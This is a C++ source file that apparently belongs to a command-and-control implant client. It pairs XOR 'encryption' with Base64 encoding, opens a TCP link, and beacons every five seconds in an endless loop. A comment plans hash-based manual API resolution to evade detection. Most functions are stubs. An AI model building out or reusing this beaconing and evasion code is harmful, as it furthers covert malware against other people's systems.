#include "ClientSubsystem.h"
#include "ComponentFactory.h"

#include <iostream>


// TODO: rename to ClientController? 
ClientSubsystem::ClientSubsystem()
{
	// loadConfig?
	// enable debugging messages (depending on config?)
	setupSubcomponents();
	setupMessaging();
	// setupEvents();
	// setupTasks();
}

ClientSubsystem::~ClientSubsystem()
{
	if (messageHandler_)
	{
		delete messageHandler_;
		//messageHandler_ = 0;
	}

	if (transportLayer_)
	{
		delete transportLayer_;
		//transportLayer_ = 0;
	}
}

void ClientSubsystem::setupMessaging()
{

	transportLayer_ = TransportLayerFactory::create(TransportLayerType::TCP);
	messageHandler_ = new MessageHandler(transportLayer_);
}

void ClientSubsystem::setupEvents()
{

}

void ClientSubsystem::setupTasks()
{

}

void ClientSubsystem::setupSubcomponents()
{
	/*
	serializer_ = new Serializer();
	encoder_ = new Encoder();
	encryptor_ = new Encryptor();
	*/
	serializer_ = new BinarySerializer();
	encoder_ = new Base64Encoder();
	encryptor_ = new XorEncryptor();
}

void ClientSubsystem::run()
{	
	//Config* config = loadConfig();
	//Config config = loadConfig();

	// 1. manually resolve apis
	/*
	TODO:
	would i be more effient to find the function/procedure names all at once for a single dll/module so i don't have
	to loop through the array of functions every single time?

	something like this:
	resolve_all_functions(dll_base, hashes, pointers, count);

	not sure if this is worth doing for dlls/modules tho

	*/
	//std::cout << "ClientSubsystem::run()" << std::endl;
	while (true)
	{
		if (!transportLayer_->isConnected())
		{
			transportLayer_->connect();
		}

		if (transportLayer_->isConnected())
		{
			transportLayer_->beacon();
		}
		Sleep(5000);
	}
}
